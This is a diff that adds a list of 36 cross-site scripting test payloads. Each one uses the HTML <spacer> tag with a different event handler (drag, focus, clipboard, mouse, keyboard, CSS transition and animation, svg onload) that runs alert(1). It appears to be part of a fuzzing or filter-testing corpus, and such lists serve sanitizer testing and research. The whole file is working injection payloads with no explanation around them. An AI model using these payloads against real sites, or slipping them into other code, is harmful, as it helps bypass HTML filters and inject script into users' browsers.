@@ -1,0 +1,36 @@
+<spacer draggable="true" ondrag="alert(1)">test</spacer>
+<spacer draggable="true" ondragend="alert(1)">test</spacer>
+<spacer draggable="true" ondragenter="alert(1)">test</spacer>
+<spacer draggable="true" ondragleave="alert(1)">test</spacer>
+<spacer draggable="true" ondragstart="alert(1)">test</spacer>
+<spacer id=x tabindex=1 onactivate=alert(1)></spacer>
+<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>
+<spacer id=x tabindex=1 onfocus=alert(1)></spacer>
+<spacer id=x tabindex=1 onfocusin=alert(1)></spacer>
+<spacer onbeforecopy="alert(1)" contenteditable>test</spacer>
+<spacer onbeforecut="alert(1)" contenteditable>test</spacer>
+<spacer onbeforepaste="alert(1)" contenteditable>test</spacer>
+<spacer onclick="alert(1)">test</spacer>
+<spacer oncontextmenu="alert(1)">test</spacer>
+<spacer oncopy="alert(1)" contenteditable>test</spacer>
+<spacer oncut="alert(1)" contenteditable>test</spacer>
+<spacer ondblclick="alert(1)">test</spacer>
+<spacer onkeydown="alert(1)" contenteditable>test</spacer>
+<spacer onkeypress="alert(1)" contenteditable>test</spacer>
+<spacer onkeyup="alert(1)" contenteditable>test</spacer>
+<spacer onmousedown="alert(1)">test</spacer>
+<spacer onmouseenter="alert(1)">test</spacer>
+<spacer onmouseleave="alert(1)">test</spacer>
+<spacer onmousemove="alert(1)">test</spacer>
+<spacer onmouseout="alert(1)">test</spacer>
+<spacer onmouseover="alert(1)">test</spacer>
+<spacer onmouseup="alert(1)">test</spacer>
+<spacer onpaste="alert(1)" contenteditable>test</spacer>
+<style>:target {color: red;}</style><spacer id=x style="transition:color 10s" ontransitioncancel=alert(1)></spacer>
+<style>:target {color:red;}</style><spacer id=x style="transition:color 1s" ontransitionend=alert(1)></spacer>
+<style>:target {transform: rotate(180deg);}</style><spacer id=x style="transition:transform 2s" ontransitionrun=alert(1)></spacer>
+<style>@keyframes slidein {}</style><spacer style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></spacer>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><spacer id=x style="position:absolute;" onanimationcancel="alert(1)"></spacer>
+<style>@keyframes x{}</style><spacer style="animation-name:x" onanimationend="alert(1)"></spacer>
+<style>@keyframes x{}</style><spacer style="animation-name:x" onanimationstart="alert(1)"></spacer>
+<svg><spacer onload=alert(1)></spacer>
